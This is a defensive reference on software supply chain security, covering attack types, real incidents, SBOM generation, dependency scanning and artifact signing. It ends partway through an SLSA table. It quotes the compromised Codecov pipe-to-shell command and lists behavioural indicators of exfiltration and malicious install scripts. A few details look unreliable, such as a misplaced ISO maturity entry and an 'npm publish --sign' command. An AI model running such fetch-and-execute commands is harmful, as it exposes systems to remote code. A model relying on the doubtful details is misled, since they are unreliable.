# Supply Chain Security Reference

> **In one minute** — This document is a working reference for securing the software supply chain: every component, build step, and distribution channel between someone's source code and what you actually run. It walks the whole problem end to end — how attacks like typosquatting, dependency confusion, and build injection work (with real incidents such as SolarWinds and XZ Utils), then the defenses: SBOMs, dependency scanners, artifact signing with Sigstore/cosign, SLSA build levels, CI/CD hardening, and incident response. Nearly every section includes copy-paste commands and configs, so it doubles as a runbook, not just background reading.

| | |
|---|---|
| **Read this when** | you need to vet or scan a project's dependencies, you're adding SBOM generation or artifact signing to a pipeline, you're hardening GitHub Actions/CI workflows, or you suspect a compromised package and need containment steps |
| **Start at** | [Threat landscape](#_1-software-supply-chain-threat-landscape) for how the attacks work, [Artifact signing & verification](#_4-artifact-signing-amp-verification) for cosign/signing workflows, [Incident response](#_10-supply-chain-incident-response) when something is already on fire |
| **Pairs with** | [SUPPLY_CHAIN_SECURITY.md](SUPPLY_CHAIN_SECURITY.md), [DEVSECOPS_REFERENCE.md](DEVSECOPS_REFERENCE.md), [CONTAINER_SECURITY_REFERENCE.md](CONTAINER_SECURITY_REFERENCE.md), [INCIDENT_RESPONSE_REFERENCE.md](INCIDENT_RESPONSE_REFERENCE.md) |

## 1. Software Supply Chain Threat Landscape

### Attack Taxonomy

The software supply chain encompasses every component, process, and party involved in developing, building, packaging, distributing, and deploying software. Attacks targeting the supply chain aim to compromise one link in this chain to propagate malicious code to downstream consumers at scale, often bypassing traditional security controls that focus on direct attacks.

#### Typosquatting

Typosquatting exploits human error in package name entry by registering package names that closely resemble popular, legitimate packages. Attackers register names with common misspellings (reqeusts instead of requests), character transpositions (lodahs instead of lodash), or visual lookalikes using Unicode homoglyphs. When developers mistype a package name or copy-paste from an unverified source, they inadvertently install malicious code. These packages often contain identical functionality to the legitimate package plus hidden malicious payloads such as credential stealers, cryptocurrency miners, or reverse shells.

Detection relies on edit-distance algorithms (Levenshtein distance ≤2 from top-1000 packages), Unicode normalization checks, and publish-time behavioral analysis. Registries like PyPI and npm have begun implementing automated typosquatting detection, but the scale of new package submissions (thousands per day) makes comprehensive coverage difficult.

#### Dependency Confusion (Namespace Confusion)

Dependency confusion attacks exploit the resolution logic of package managers when both public and private registries are configured. When a private package (e.g., company-internal-utils) exists on an internal registry but a public registry entry with the same name and a higher version number is created by an attacker, many package managers default to fetching from the public registry.

Alex Birsan demonstrated this attack in 2021, successfully targeting 35 major companies including Apple, Microsoft, PayPal, Shopify, Netflix, Yelp, and Tesla, earning over $130,000 in bug bounty rewards. The fix requires scoped packages (@company/package-name in npm), private registry priority configuration, or using --index-url with --no-index flags in pip.

#### Malicious Maintainer

A legitimate project maintainer turns malicious, transfers ownership to a bad actor, or has their account compromised. Unlike other supply chain attacks, malicious maintainer attacks leverage established trust and existing user bases. The event-stream incident (2018) saw a new maintainer added to the popular npm package who then published a hidden payload targeting cryptocurrency wallets. The payload was obfuscated using minification and only activated on specific system configurations.

Account takeover is the most common vector—attackers target maintainers with weak passwords, absent MFA, or via phishing campaigns. Platforms have responded with mandatory 2FA for high-impact packages (npm requires 2FA for packages with >1M weekly downloads).

#### Build System Injection

Attackers compromise the build infrastructure itself rather than source code. This includes CI/CD server compromise, build script manipulation, artifact repository poisoning, and compiler/toolchain backdoors. The canonical example is the SolarWinds SUNBURST attack where malicious code was injected into the Orion build process, signing legitimate binaries with valid certificates.

Build injection attacks are particularly dangerous because they affect signed artifacts—the signature validates that the artifact came from a legitimate build process, not that the build process itself was clean. Mitigations include hermetic builds, reproducible builds, SLSA provenance attestations, and separation of build infrastructure from development environments.

#### Compromised Update Server

Attackers compromise the distribution infrastructure used to deliver software updates. This includes CDN hijacking, mirror server compromise, BGP hijacking to redirect traffic, and DNS poisoning. Unlike source code attacks, update server compromises can deliver malicious payloads to all users regardless of when they installed the software.

The NotPetya attack (2017) leveraged a compromised update server for M.E.Doc accounting software, affecting organizations primarily in Ukraine and spreading globally. Mitigations include TUF (The Update Framework) for secure update delivery, signed update manifests, and cryptographic verification of all downloaded artifacts.

### MITRE ATT&CK Supply Chain Techniques

**T1195.001 — Compromise Software Dependencies and Development Tools**: Adversaries manipulate software dependencies prior to receipt by the final consumer. This includes compromising package repositories, injecting malicious code into open-source dependencies, and targeting development tool distributions.

**T1195.002 — Compromise Software Supply Chain**: Adversaries manipulate application software prior to receipt by a final consumer. Involves tampering with software during distribution or within a distribution infrastructure, such as compromising update servers, installers, or distribution channels.

**T1195.003 — Compromise Hardware Supply Chain**: Adversaries manipulate hardware components prior to delivery to the end consumer. Encompasses firmware modifications, malicious hardware implants, and counterfeit components.

**T1554 — Compromise Client Software Binary**: Adversaries modify client software binaries to establish persistent access. Can involve patching existing binaries on disk or replacing them entirely, leveraging the implicit trust users place in installed software.

**T1574 — Hijack Execution Flow**: Adversaries execute their own malicious payloads by hijacking the way operating systems run programs. Subtechniques include DLL search order hijacking (T1574.001), DLL side-loading (T1574.002), and PATH interception (T1574.007).

### Notable Supply Chain Incidents

#### SolarWinds SUNBURST (2020)
Timeline:
- October 2019: Attackers gain initial access to SolarWinds network
- February 2020: Test injections placed into Orion build system to test detection
- March 2020: SUNBURST malware injected into Orion Platform software (versions 2019.4 through 2020.2.1)
- March-June 2020: Malicious Orion updates distributed to ~18,000 customers including US government agencies
- December 8, 2020: FireEye discloses breach and discovers supply chain attack
- December 13, 2020: Microsoft, FireEye, and GoDaddy seize SUNBURST C2 domain

Technical details: SUNBURST was injected into SolarWinds.Orion.Core.BusinessLayer.dll, a legitimate signed component. The malware lay dormant for ~2 weeks after installation, then communicated via DGA (Domain Generation Algorithm) beacons using avsvmcloud[.]com subdomains. HTTP traffic was encoded to mimic legitimate Orion API traffic. The malware performed reconnaissance, exfiltrated data, and could deliver second-stage payloads (TEARDROP). Approximately 100 organizations were deeply compromised, including FireEye, Microsoft, and multiple US federal agencies (Treasury, Commerce, Homeland Security, State, NIH).

#### XZ Utils CVE-2024-3094 (2024)
Timeline:
- Early 2022: "Jia Tan" (JiaT75) begins making contributions to XZ Utils project
- 2022-2023: Jia Tan builds credibility with legitimate bug fixes and becomes co-maintainer
- February 2024: Malicious code added to XZ Utils 5.6.0 and 5.6.1 via modified build scripts
- March 29, 2024: Andres Freund discovers backdoor via anomalous SSH login slowness
- March 29, 2024: CVE-2024-3094 disclosed, emergency patches released

Technical details: The backdoor targeted systemd-linked sshd on glibc-based Linux systems. The malicious code was concealed in test files and activated via a malicious ifunc resolver that intercepted RSA key decryption in OpenSSH. The attacker used a forged signature verification bypass allowing authentication with any key. The social engineering campaign lasted ~2 years, demonstrating sophisticated long-term supply chain infiltration. The attack is attributed to a nation-state actor with resources for multi-year operations.

#### Codecov Breach (2021)
Attackers modified Codecov's bash uploader script hosted on codecov.io. The modified script exfiltrated environment variables (including CI secrets and API tokens) to an attacker-controlled server. Since the standard usage was `curl -s https://codecov.io/bash | bash`, every CI pipeline using Codecov was affected. Over 29,000 customers used the bash uploader. The attack exposed secrets from thousands of CI pipelines including tokens for Twilio, Hashicorp, Rapid7, and others.

#### 3CX Double Supply Chain Attack (2023)
The 3CX attack is notable as a double supply chain compromise: ICON Trading's legitimate software was first compromised (via North Korean Lazarus Group), and the resulting malicious ICON installer was then used to compromise a 3CX developer's machine. This compromised developer's credentials were used to inject malicious code into the 3CX Electron-based softphone application. The final malicious 3CX application was signed with a valid certificate and distributed to ~600,000 3CX customers globally.

#### PyPI Malware Campaigns
**W4SP Stealer (2022)**: Multiple packages including pyquest, ultrarequests, pystyle, and numerous others contained W4SP stealer targeting Discord tokens, browser cookies, cryptocurrency wallets, and saved passwords. Packages had thousands of downloads before detection.

**ctx/phpass Typosquatting (2022)**: Security researcher demonstrated compromise of ctx (Python package) and phpass (PHP) packages by registering expired domains used as home pages, then publishing malicious versions. The ctx package had ~20,000 monthly downloads.

#### npm Malicious Packages
**event-stream (2018)**: Dominic Tarr transferred ownership to user right9ctrl who added a new dependency (flatmap-stream) containing an encrypted payload targeting the Copay Bitcoin wallet. The payload only activated on specific Bitcoin wallet codebases. Discovered after 8 million downloads.

**node-ipc (2022)**: Maintainer RIAEvangelist added malicious code (peacenotwar) that wiped files on Russian and Belarusian systems in response to the Ukraine invasion. The maintainer had activist intent rather than financial motivation, demonstrating insider threat scenarios.

### SLSA Threat Model Categories

The SLSA threat model defines attack surfaces across four categories:
1. **Source integrity threats**: Malicious commits, unauthorized changes, source control bypass
2. **Build integrity threats**: Compromised build system, injected build steps, tampered artifacts
3. **Dependency integrity threats**: Malicious dependencies, compromised registries, version pinning bypass
4. **Deployment integrity threats**: Artifact tampering in transit, registry poisoning, update server compromise


## 2. Software Bill of Materials (SBOM)

### SBOM Format Comparison: CycloneDX 1.6 vs SPDX 2.3

| Feature | CycloneDX 1.6 | SPDX 2.3 |
|---------|---------------|----------|
| Governing Body | OWASP | Linux Foundation / SPDX Workgroup |
| Primary Formats | JSON, XML, Protobuf | Tag-Value, JSON, YAML, RDF, XLS |
| Component Types | application, container, device, file, firmware, framework, library, machine-learning-model, operating-system, service | Package, File, Snippet, Relationship |
| License Expression | SPDX license IDs supported | Native SPDX license expressions |
| VEX Integration | Native (vulnerabilities field, VEX BOM) | Via external VEX documents |
| Service Dependencies | Yes (services component type) | Limited (external relationships) |
| Attestation Support | Signature field, evidence | No native signing |
| Cryptographic Hashes | MD5, SHA-1, SHA-256, SHA-384, SHA-512, SHA3-256, SHA3-384, SHA3-512, BLAKE2b-256, BLAKE2b-384, BLAKE2b-512, BLAKE3 | MD5, SHA-1, SHA-256, SHA-384, SHA-512, SHA3-256, SHA3-384, SHA3-512 |
| PURL Support | Yes (native) | Yes (externalRef with PURL type) |
| CPE Support | Yes (native) | Yes (externalRef with CPE type) |
| Dependency Graph | Yes (dependencies element) | Yes (DESCRIBES, CONTAINS, DEPENDS_ON relationships) |
| Maturity | ISO/IEC 5962 (SPDX 2.2) standard | Widely adopted in FOSS ecosystem |
| Tooling | cdxgen, cyclonedx-cli, Syft, Trivy | SPDX tools, FOSSology, Syft, Trivy |
| Primary Use Case | Security (vulnerability tracking, VEX) | License compliance, open source auditing |

### NTIA Minimum Elements for SBOM

Per the National Telecommunications and Information Administration (NTIA) guidance "The Minimum Elements For a Software Bill of Materials" (July 2021), every SBOM must contain:

1. **Supplier Name**: The name of an entity that creates, defines, and identifies components. May be a software author, open source project, or commercial vendor.

2. **Component Name**: Designation assigned to a unit of software defined by the original supplier. The human-readable name used to identify the component.

3. **Version of the Component**: Identifier used by the supplier to specify a change in software from a previously identified version. Includes version strings, commit hashes, or build numbers.

4. **Other Unique Identifiers**: Other identifiers used to identify a component or serve as a look-up key for relevant databases. Package URL (PURL), Common Platform Enumeration (CPE), and Software Identifier (SWID) tags serve this function.

5. **Dependency Relationships**: Characterizing the relationship that an upstream component X is included in software Y. Must document direct dependencies; transitive dependencies are recommended.

6. **Author of SBOM Data**: The name of the entity that created the SBOM data for the component. May differ from the component supplier (e.g., a third-party auditor generating the SBOM).

7. **Timestamp**: Record of the date and time of the SBOM data assembly. ISO 8601 format (2024-01-15T10:30:00Z) required.

### Executive Order 14028 SBOM Requirements

President Biden's Executive Order on Improving the Nation's Cybersecurity (May 2021) directed NTIA to define minimum SBOM elements and required federal agencies to adopt SBOM practices. Key requirements for software sold to the federal government:
- SBOM must be provided for all software components
- SBOM must be in machine-readable format
- SBOM data must be available to purchasers
- Automated tooling for SBOM generation recommended
- Self-attestation forms required for critical software

### EU Cyber Resilience Act (CRA) — Article 13 Requirements

The EU CRA (effective 2024, compliance required by 2027) requires manufacturers of products with digital elements to:
- Generate and maintain SBOM for the lifetime of the product plus 10 years
- Provide SBOM to market surveillance authorities on request
- Publish VEX (Vulnerability Exploitability eXchange) documents when vulnerabilities are discovered
- Implement vulnerability disclosure policies
- Report actively exploited vulnerabilities within 24 hours
- Report vulnerabilities within 72 hours with full impact assessment

### SBOM Generation Tools

**Syft (Anchore)**
```bash
# Generate CycloneDX JSON from container image
syft packages image:nginx -o cyclonedx-json > nginx-sbom.json

# Generate SPDX from filesystem
syft packages dir:./myapp -o spdx-json > myapp-sbom.spdx.json

# Generate from OCI image tar
syft packages docker-archive:myimage.tar -o cyclonedx-json

# Output multiple formats simultaneously
syft packages image:nginx -o cyclonedx-json=sbom.cdx.json -o spdx-json=sbom.spdx.json
```

**cdxgen (OWASP)**
```bash
# Python project
cdxgen -t python -o bom.json .

# Node.js project
cdxgen -t nodejs -o bom.json .

# Java Maven project
cdxgen -t maven -o bom.json .

# Container image
cdxgen -t docker --image nginx:latest -o bom.json

# Recursive with all supported languages
cdxgen -r -o bom.json .
```

**Trivy (Aqua Security)**
```bash
# Container image in CycloneDX format
trivy image --format cyclonedx nginx > nginx-sbom.json

# Filesystem scan in SPDX format
trivy fs --format spdx-json . > project-sbom.json

# Include dev dependencies
trivy image --format cyclonedx --include-dev-deps nginx

# Output to file
trivy image --format cyclonedx --output sbom.json nginx:latest
```

**SPDX Tools**
```bash
# Validate SPDX document
java -jar spdx-tools.jar Verify sbom.spdx.json

# Convert between formats
java -jar spdx-tools.jar Convert sbom.spdx sbom.spdx.json

# Generate from source (with FOSSology integration)
fossology-spdx --output sbom.spdx ./source-dir
```

### SBOM Quality Scoring Criteria

A high-quality SBOM should score well across these dimensions:
1. **Completeness**: All components present including transitive dependencies (target: >95%)
2. **Accuracy**: Component versions, licenses, and checksums are correct
3. **Freshness**: SBOM generated at build time, not retrospectively
4. **Machine-readability**: Standard format (CycloneDX/SPDX) parseable by tooling
5. **Uniqueness**: All components have unique identifiers (PURL or CPE)
6. **Authenticity**: SBOM is signed and its integrity verifiable
7. **Sharing**: SBOM is accessible to downstream consumers via HTTPS or transparency log

### Package URL (PURL) Format

PURL provides a standardized format for identifying packages across ecosystems:

```
pkg:type/namespace/name@version?qualifiers#subpath
```

Examples:
```
pkg:npm/lodash@4.17.21
pkg:npm/%40angular/core@15.2.0          # Scoped package
pkg:pypi/requests@2.28.0
pkg:pypi/django@4.2.1
pkg:maven/org.springframework/spring-core@6.0.9
pkg:gem/rails@7.0.6
pkg:golang/github.com/gin-gonic/gin@v1.9.1
pkg:cargo/serde@1.0.164
pkg:nuget/Newtonsoft.Json@13.0.3
pkg:docker/library/nginx@sha256:abc123
pkg:github/pallets/flask@3.0.0
pkg:rpm/fedora/python3@3.11.0-1.fc38
pkg:deb/debian/curl@7.88.1-10+deb12u1
```

### CPE 2.3 Format

Common Platform Enumeration (CPE) 2.3 provides a structured naming scheme for IT systems, platforms, and packages:

```
cpe:2.3:part:vendor:product:version:update:edition:language:sw_edition:target_sw:target_hw:other

Examples:
cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*
cpe:2.3:a:python:requests:2.28.0:*:*:*:*:*:*:*
cpe:2.3:a:openssl:openssl:3.0.7:*:*:*:*:*:*:*
cpe:2.3:o:linux:linux_kernel:6.1.0:*:*:*:*:*:*:*
```

Parts: a=application, o=operating system, h=hardware

### SBOM Sharing Mechanisms

SBOMs should be shared via:
1. **HTTPS endpoint**: Stable URL returning machine-readable SBOM (e.g., https://example.com/.well-known/sbom.json)
2. **OCI registry attachment**: `cosign attach sbom --sbom sbom.spdx.json ghcr.io/owner/image`
3. **Transparency logs**: Publishing SBOM hash to Rekor for immutability verification
4. **Package registry metadata**: Embedding SBOM reference in package manifest
5. **Release artifact**: Including SBOM in GitHub Releases alongside binary artifacts


## 3. Dependency Security

### Ecosystem-Specific Vulnerability Scanners

#### npm / Node.js
```bash
# Built-in audit (queries npm advisory database)
npm audit --json | jq '.vulnerabilities | keys[]'

# Fix automatically (safe fixes only)
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force

# Check specific package
npm audit --package-lock-only

# Audit with output levels
npm audit --audit-level=high    # Exit 1 only on high/critical

# Using better-npm-audit for CI
npx better-npm-audit audit --level high --production
```

#### Python
```bash
# pip-audit - checks PyPI Advisory Database and OSV
pip-audit -r requirements.txt --format=json -o audit-results.json

# Check specific package
pip-audit --package requests==2.20.0

# Fix in place (updates requirements.txt)
pip-audit -r requirements.txt --fix

# Safety (uses Safety DB - commercial, free tier available)
safety check -r requirements.txt --full-report
safety check --json -r requirements.txt

# Check installed packages
pip-audit --skip-editable
```

#### Java / Maven
```bash
# OWASP Dependency Check
mvn dependency-check:check

# With HTML report
mvn dependency-check:check -Dformat=HTML

# Fail on CVSS score >= 7
mvn dependency-check:check -DfailBuildOnCVSS=7

# Gradle
gradle dependencyCheckAnalyze

# Output formats: HTML, XML, JSON, CSV, JUNIT, SARIF
mvn dependency-check:check -Dformat=SARIF -DoutputDirectory=target/reports
```

#### Go
```bash
# govulncheck - uses Go vulnerability database
govulncheck ./...

# Check specific module
govulncheck github.com/gin-gonic/gin@v1.8.0

# Output in JSON for CI integration
govulncheck -json ./... | jq '.findings[].osv.id'

# Nancy (Sonatype) for Go dependencies
go list -json -m all | nancy sleuth
```

#### Rust
```bash
# cargo-audit - uses RustSec Advisory Database
cargo audit

# Output in JSON
cargo audit --json | jq '.vulnerabilities.list[].advisory.id'

# Fix by updating dependencies
cargo audit fix

# Deny specific advisory IDs
cargo audit --deny warnings

# cargo-deny - comprehensive dependency policy tool
cargo deny check advisories
cargo deny check licenses
cargo deny check bans
```

#### Ruby
```bash
# bundler-audit
bundle audit check --update   # Update advisory DB and check

# Check specific gemfile
bundle audit check --gemfile=Gemfile.lock

# Output formats
bundle audit check --format json

# Output only vulnerabilities (no unpatched gems)
bundle audit check --ignore OSVDB-...
```

### Dependabot Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  # npm dependencies
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "America/New_York"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "npm"
    ignore:
      - dependency-name: "lodash"
        versions: ["4.x"]
      - dependency-name: "aws-sdk"
        update-types: ["version-update:semver-major"]
    groups:
      dev-dependencies:
        dependency-type: "development"
        update-types: ["minor", "patch"]

  # Python dependencies
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    versioning-strategy: increase-if-necessary

  # Docker base images
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns:
          - "*"
```

### Renovate Configuration

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:base",
    "security:openssf-scorecard"
  ],
  "schedule": ["before 9am on monday"],
  "labels": ["dependencies"],
  "prCreation": "not-pending",
  "automerge": false,
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "matchCurrentVersion": "!/^0/",
      "automerge": true,
      "automergeType": "pr",
      "platformAutomerge": true
    },
    {
      "groupName": "AWS SDK packages",
      "matchPackagePrefixes": ["@aws-sdk/", "aws-sdk"],
      "schedule": ["before 9am on monday"]
    },
    {
      "matchDepTypes": ["devDependencies"],
      "matchUpdateTypes": ["minor", "patch"],
      "groupName": "dev dependencies (non-major)"
    },
    {
      "matchLanguages": ["python"],
      "rangeStrategy": "bump"
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security", "dependencies"],
    "automerge": false
  },
  "osvVulnerabilityAlerts": true
}
```

### OSV Database API

The Open Source Vulnerability (OSV) database provides a unified vulnerability feed:

```bash
# Query by package name and version
curl -X POST https://api.osv.dev/v1/query   -H "Content-Type: application/json"   -d '{
    "version": "4.17.20",
    "package": {
      "name": "lodash",
      "ecosystem": "npm"
    }
  }' | jq '.vulns[].id'

# Query by commit hash
curl -X POST https://api.osv.dev/v1/query   -H "Content-Type: application/json"   -d '{
    "commit": "6879efc2c1596d11a6a6ad296f80063b558d5e0f"
  }'

# Batch query multiple packages
curl -X POST https://api.osv.dev/v1/querybatch   -H "Content-Type: application/json"   -d '{
    "queries": [
      {"package": {"name": "flask", "ecosystem": "PyPI"}, "version": "2.0.0"},
      {"package": {"name": "django", "ecosystem": "PyPI"}, "version": "3.2.0"}
    ]
  }'

# Get specific vulnerability details
curl https://api.osv.dev/v1/vulns/GHSA-jfh8-c2jp-hdp8
```

**osv-scanner CLI:**
```bash
# Scan lockfile
osv-scanner --lockfile=package-lock.json

# Scan directory (auto-detects lockfiles)
osv-scanner --recursive .

# Scan SBOM
osv-scanner --sbom=sbom.spdx.json

# JSON output for CI
osv-scanner --json --lockfile=requirements.txt

# Multiple ecosystems
osv-scanner --lockfile=package-lock.json --lockfile=requirements.txt --lockfile=Cargo.lock
```

### Reachability Analysis

Traditional dependency scanners report all vulnerabilities in all dependencies, including vulnerabilities in code paths that are never called. Reachability analysis reduces false positives by determining whether vulnerable code is actually called in the application's execution paths.

**Endor Labs** performs static analysis to build a call graph from the application through all its dependencies, then maps CVEs to specific functions. Only vulnerabilities in reachable functions are flagged, reducing alert noise by 80-95% in typical applications.

**Concept**: A vulnerability in lodash.merge() is only exploitable if your application actually calls lodash.merge() with user-controlled data flowing into the merge path. Reachability analysis traces these paths.

### Socket.dev Behavioral Analysis

Socket.dev analyzes package behavior beyond known CVEs:
- **Install scripts**: Detection of postinstall/preinstall scripts that execute code (high risk)
- **Network access**: Packages that make outbound HTTP/DNS calls during or after install
- **Obfuscated code**: Base64 encoding, eval() usage, dynamic require() with string concatenation
- **Environment variable access**: process.env access patterns indicating potential exfiltration
- **File system access**: Unusual file read/write patterns outside package directory
- **Binary execution**: child_process.exec() or spawn() calls with external commands
- **Dependency confusion indicators**: Unusual version bumps, new maintainers, changed package metadata

### License Compliance Scanning

```bash
# FOSSA - comprehensive license scanning
fossa analyze --output json > licenses.json
fossa test  # Fails if license policy violations found

# License Checker (npm)
npx license-checker --json --out licenses.json
npx license-checker --failOn "GPL-2.0;AGPL-3.0"

# pip-licenses (Python)
pip-licenses --format=json --output-file=licenses.json
pip-licenses --fail-on="GPL;AGPL"

# licensee (Ruby)
licensee detect .
```

**Common License Risk Categories:**
- **Permissive** (low risk): MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC
- **Weak copyleft** (medium risk, review required): LGPL-2.1, MPL-2.0, EPL-2.0
- **Strong copyleft** (high risk, legal review required): GPL-2.0, GPL-3.0, AGPL-3.0
- **Proprietary/commercial**: Must verify terms; typically incompatible with open-source distribution

### Transitive Dependency Graph Visualization

```bash
# npm dependency tree
npm ls --all --json | jq . > dep-tree.json

# Specific depth
npm ls --depth=3

# Why is a package installed?
npm why lodash

# Python dependency resolution
pip install pipdeptree
pipdeptree --json-tree > dep-tree.json
pipdeptree --graph-output png > dep-graph.png

# Go module graph
go mod graph | modgraphviz | dot -Tpng -o graph.png

# Cargo dependency tree
cargo tree --format "{p}" --prefix depth
cargo tree -d  # Show duplicate dependencies
```


## 4. Artifact Signing & Verification

### Sigstore / Cosign Keyless Signing

Sigstore provides a standard for signing software artifacts without long-lived private keys. The keyless signing flow uses ephemeral OIDC-based identities bound to Fulcio (a certificate authority) with signatures recorded in Rekor (a transparency log).

#### Signing a Container Image (GitHub Actions)

```yaml
# In GitHub Actions workflow
- name: Sign container image
  run: |
    cosign sign --yes ghcr.io/owner/image@sha256:abc123def456...
  env:
    COSIGN_EXPERIMENTAL: "true"
```

```bash
# Manual keyless signing (requires OIDC token from environment)
cosign sign --yes ghcr.io/owner/image@sha256:abc123def456

# Sign with specific OIDC provider
cosign sign --yes   --oidc-issuer=https://token.actions.githubusercontent.com   ghcr.io/owner/image@sha256:abc123def456

# Sign with key-based approach (traditional)
cosign sign --key cosign.key ghcr.io/owner/image:tag

# Sign binary artifacts
cosign sign-blob --yes --bundle=artifact.bundle ./myapp-linux-amd64
```

#### OIDC Identity Binding via Fulcio CA

When cosign signs an artifact:
1. Cosign requests an OIDC token from the identity provider (GitHub Actions, Google, Microsoft)
2. The OIDC token is presented to Fulcio CA
3. Fulcio verifies the OIDC token and issues a short-lived X.509 certificate containing the identity
4. Cosign uses the ephemeral key associated with the certificate to sign the artifact
5. The certificate and signature are uploaded to Rekor
6. The ephemeral private key is discarded

Certificate subject alternative names (SANs) encode the identity:
- GitHub Actions: `https://github.com/owner/repo/.github/workflows/release.yml@refs/tags/v1.0.0`
- Google Cloud Build: `service-account@project.iam.gserviceaccount.com`
- GitLab CI: `https://gitlab.com/owner/project//.gitlab-ci.yml@refs/heads/main`

#### Rekor Transparency Log Entry Structure

```json
{
  "body": "<base64-encoded-entry>",
  "integratedTime": 1706745600,
  "logID": "c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d",
  "logIndex": 12345678,
  "verification": {
    "inclusionProof": {
      "checkpoint": "rekor.sigstore.dev - 2605...",
      "hashes": ["sha256:abc...", "sha256:def..."],
      "logIndex": 12345678,
      "rootHash": "sha256:xyz...",
      "treeSize": 50000000
    },
    "signedEntryTimestamp": "<base64-encoded-SET>"
  }
}
```

#### Verification

```bash
# Verify keyless signature with GitHub Actions identity
cosign verify   --certificate-identity-regexp '.*'   --certificate-oidc-issuer https://token.actions.githubusercontent.com   ghcr.io/owner/image:tag | jq .

# Verify specific identity
cosign verify   --certificate-identity "https://github.com/owner/repo/.github/workflows/release.yml@refs/tags/v1.0.0"   --certificate-oidc-issuer https://token.actions.githubusercontent.com   ghcr.io/owner/image@sha256:abc123

# Verify blob
cosign verify-blob   --bundle=artifact.bundle   --certificate-identity "https://github.com/owner/repo/.github/workflows/release.yml@refs/tags/v1.0.0"   --certificate-oidc-issuer https://token.actions.githubusercontent.com   ./myapp-linux-amd64
```

### Sigstore Policy Controller

```yaml
# ClusterImagePolicy enforcing signed images
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: require-signed-images
spec:
  images:
    - glob: "ghcr.io/myorg/**"
    - glob: "docker.io/myorg/**"
  authorities:
    - keyless:
        url: https://fulcio.sigstore.dev
        identities:
          - issuer: https://token.actions.githubusercontent.com
            subjectRegExp: "https://github.com/myorg/.*"
      ctlog:
        url: https://rekor.sigstore.dev
        trustRootRef: public-good
  policy:
    type: cue
    data: |
      package sigstore
      import "time"
      before: time.Parse(time.RFC3339, "2025-01-01T00:00:00Z")
      isCompliant: attestations.all(_, _.predicateType == "https://slsa.dev/provenance/v1")
```

### Notation (CNCF)

Notation is a CNCF project for signing OCI artifacts using X.509 certificates:

```bash
# Sign an image
notation sign $IMAGE

# Verify signature
notation verify $IMAGE

# List signatures
notation list $IMAGE

# Sign with specific key
notation sign --key my-signing-key $IMAGE

# Add signature policy
notation policy import policy.json

# Inspect signature
notation inspect $IMAGE
```

### In-toto Attestations

In-toto attestations are signed, structured claims about software artifacts. The attestation envelope contains a predicate describing what the attestation claims.

**Predicate Types:**
- `https://slsa.dev/provenance/v1` — SLSA Provenance (build origin, inputs, environment)
- `https://spdx.dev/Document` — SBOM in SPDX format
- `https://cyclonedx.org/bom` — SBOM in CycloneDX format
- `https://in-toto.io/attestation/test-result/v0.1` — Test results
- `https://in-toto.io/attestation/vuln/v0.1` — Vulnerability scan results
- `https://in-toto.io/attestation/link/v0.3` — Link (step evidence in a supply chain layout)

```bash
# Attach SLSA provenance attestation
cosign attest --predicate provenance.json   --type slsaprovenance   ghcr.io/owner/image@sha256:abc123

# Attach SBOM attestation
cosign attest --predicate sbom.spdx.json   --type spdx   ghcr.io/owner/image@sha256:abc123

# Verify attestation
cosign verify-attestation   --type slsaprovenance   --certificate-identity-regexp '.*'   --certificate-oidc-issuer https://token.actions.githubusercontent.com   ghcr.io/owner/image@sha256:abc123 | jq '.payload | @base64d | fromjson'
```

### GitHub Actions Artifact Attestations

```yaml
# In workflow
- name: Attest Build Provenance
  uses: actions/attest-build-provenance@v1
  with:
    subject-path: ./dist/myapp-linux-amd64

- name: Attest SBOM
  uses: actions/attest-sbom@v1
  with:
    subject-path: ./dist/myapp-linux-amd64
    sbom-path: ./sbom.spdx.json
```

```bash
# Verify using gh CLI
gh attestation verify ./myapp-linux-amd64   --repo owner/repo   --signer-repo actions/attest-build-provenance

# Verify container image attestation
gh attestation verify oci://ghcr.io/owner/image:tag   --repo owner/repo
```

### GPG Signing for npm Packages

```bash
# Generate GPG key
gpg --full-generate-key

# Export public key
gpg --armor --export your@email.com > public.asc

# Publish to keyserver
gpg --keyserver hkps://keyserver.ubuntu.com --send-keys YOUR_KEY_ID

# Sign npm package before publish
npm publish --sign

# Configure npm to sign by default
npm config set sign-git-tag true
npm config set sign-git-commit true
```

### TUF (The Update Framework)

TUF provides a secure framework for software update systems with defense against various key compromise scenarios.

**Role Hierarchy:**
- **Root**: Top-level trust anchor; signs metadata about other keys; long validity period; typically kept offline
- **Targets**: Signs metadata about software artifacts (hashes, sizes); offline or HSM-protected
- **Snapshot**: Signs metadata about current state of all targets metadata; may be online
- **Timestamp**: Signs freshness guarantee for snapshot metadata; must be online, short validity (hours/days)

**TUF Client Update Workflow:**
1. Download timestamp.json to check freshness
2. Verify timestamp.json against trusted timestamp key
3. Download snapshot.json if timestamp indicates it changed
4. Verify snapshot.json against trusted snapshot key
5. Check snapshot.json for consistency
6. Download targets.json if snapshot indicates it changed
7. Verify targets.json against trusted targets key
8. For each target: download target file, verify hash against targets.json

**Key rotation**: When a key is compromised, the parent role re-signs with a new key reference. Root key compromise requires an out-of-band root update process.

```python
# Using python-tuf client
from tuf.ngclient import Updater

updater = Updater(
    metadata_dir="/tmp/tuf-metadata",
    metadata_base_url="https://updates.example.com/",
    target_base_url="https://updates.example.com/targets/",
    target_dir="/tmp/downloads"
)
updater.find_cached_target(updater.get_targetinfo("myapp-v1.2.3.tar.gz"))
```


## 5. SLSA Framework

### SLSA Levels Requirements Table

SLSA (Supply chain Levels for Software Artifacts) defines a graduated set of requirements for build integrity:

| Requirement | L0 | L1 | L2 | L3 |
